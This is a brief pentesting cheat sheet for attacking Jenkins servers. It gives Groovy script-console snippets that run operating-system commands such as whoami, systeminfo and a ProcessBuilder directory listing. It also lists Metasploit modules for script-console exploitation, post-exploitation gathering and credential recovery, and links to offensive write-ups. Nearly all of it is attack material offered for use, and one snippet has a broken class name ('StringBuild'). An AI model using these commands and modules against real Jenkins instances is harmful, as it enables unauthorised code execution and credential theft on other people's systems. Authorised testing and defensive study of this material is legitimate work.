# Jenkins

## Scripting

```groovy
println "<command>".execute().text;

println "whoami".execute().text;

println "systeminfo".execute().text;
```

```groovy
println "Command processor"
def sout = new StringBuild(), serr = new StringBuilder();
def args = ["cmd", "/c", "dir C:\\path\\to\\directory\\"];
def proc = new ProcessBuilder(args);
Process process = proc.start();
process.consumeProcessOutput(sout, serr);
process.waitForOrKill(2000);
println sout;
```

## Metasploit

```
msf > use exploit/multi/http/jenkins_script_console

set rhost <target_IP>

set rport <target_PORT>
```

```
msf > use post/multi/gather/jenkins_gather

auxiliary/gather/jenkins_cred_recovery
```

---
## References

### Source Repositories

- [gquere: Pwn Jenkins](https://github.com/gquere/pwn_jenkins)

### Hacktricks

- [Hacktricks: Jenkins](https://cloud.hacktricks.xyz/pentesting-ci-cd/jenkins-security)

### Hacking Articles

- [Hacking Articles: Jenkins Penetration Testing](https://www.hackingarticles.in/jenkins-penetration-testing/)

### Highon Coffee

- [Highon Coffee: Jenkins RCE via Unauthenticated API](https://highon.coffee/blog/jenkins-api-unauthenticated-rce-exploit/)

### HDYSec

- [HDYSec: Double Pivoting both Metasploit and Manual Pivoting](https://web.archive.org/web/20240226150345/https://www.hdysec.com/double-pivoting-both-metasploit-and-manual/)

### TrustedSec

- [TrustedSec: Offensively Groovy](https://trustedsec.com/blog/offensively-groovy)